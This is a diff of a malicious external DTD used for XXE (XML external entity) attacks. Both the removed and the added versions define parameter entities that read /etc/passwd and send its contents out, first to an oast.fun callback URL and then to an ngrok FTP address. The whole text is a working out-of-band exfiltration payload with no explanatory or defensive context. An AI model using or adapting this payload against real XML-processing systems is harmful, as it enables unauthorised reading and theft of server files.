@@ -1,4 +1,4 @@
-<!ENTITY % file PUBLIC "f" "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil PUBLIC 'x' 'https://edkuagswqzhsajcmzino3fqh5058hif0f.oast.fun/?x=%file;'>">
+<!ENTITY % file PUBLIC "-//F//1//EN" "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil PUBLIC '-//F//2//EN' 'ftp://0.tcp.ap.ngrok.io:28190/%file;'>">
 %eval;
 %exfil;
